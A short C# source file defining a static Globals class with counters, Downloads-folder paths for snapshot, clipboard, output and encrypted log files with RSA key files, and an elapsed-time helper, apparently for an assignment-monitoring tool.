
public static class Globals
{
    // Counters
    public static int snapshotCounter = 1;
    public static int clipboardCounter = 1;
    public static int outputCounter = 1;
    // Addresses
    public static string filePath = Environment.GetEnvironmentVariable("USERPROFILE") + @"\" + "Downloads/TratherLogs/";
    public static string filePathZip = Environment.GetEnvironmentVariable("USERPROFILE") + @"\" + "Downloads/TratherLogs.zip";
    public static string snapshotsAddress = filePath + "snapshots.txt";
    public static string clipboardAddress = filePath + "clipboard.txt";
    public static string downloadAddress = filePath + "assignment.py";
    public static string outputAddress = filePath + "output.txt";
    public static string inputFilePath = "";
    public static string cryptFolder = Environment.GetEnvironmentVariable("USERPROFILE") + @"\" + "Downloads/Cryptog/";
    public static string PubKeyFile = cryptFolder + "rsaPublicKey.txt";
    public static string PrivKeyFile = cryptFolder + "rsaPrivateKey.txt";
    public static string encryptedZip = cryptFolder + "TratherLogs";
    // Time
    public static DateTime start = DateTime.Now;
    public static TimeSpan timeElapsed()
    {
        DateTime current = DateTime.Now;

        TimeSpan ts = current - start;


        return ts;
    }
}
